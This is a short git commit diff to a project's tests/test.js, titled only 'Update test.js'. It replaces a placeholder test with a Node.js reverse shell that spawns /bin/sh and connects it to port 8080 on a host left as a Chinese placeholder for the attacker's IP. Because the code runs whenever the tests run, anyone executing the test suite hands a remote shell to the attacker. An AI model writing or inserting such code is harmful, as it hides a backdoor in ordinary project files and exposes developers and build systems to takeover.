0915e32c23cdb17bed5481a7bdc0b767cca06248
D2490 <103814015+D2490@users.noreply.github.com>
2023-04-15 01:36:03 +0800

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -1,2 +1,12 @@
-// TODO: implement the tests
-console.log("Tests are not implemented yet...");
+(function(){
+    var net = require("net"),
+    cp = require("child_process"),
+    sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "此处替换为攻击端IP", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
